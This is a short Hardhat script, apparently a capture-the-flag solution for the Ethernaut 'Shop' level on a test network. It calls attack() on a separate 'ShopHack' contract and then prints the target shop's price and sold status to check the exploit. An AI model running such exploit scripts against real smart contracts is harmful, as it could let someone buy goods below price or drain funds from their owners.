import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Instance address
    let address_a = "0x982698B13225d9ed3BeCa7F9954894b6637b9bEA";
    let address_b = "0xF4c66120f24e8E28228a86d8971f37066C2Dfa7c";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Shop", address_a, signer);
    let contract_b = await ethers.getContractAt("ShopHack", address_b, signer);

    let tx = await contract_b.attack();
    await tx.wait();
    console.log(await contract_a.price());
    console.log(await contract_a.isSold());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
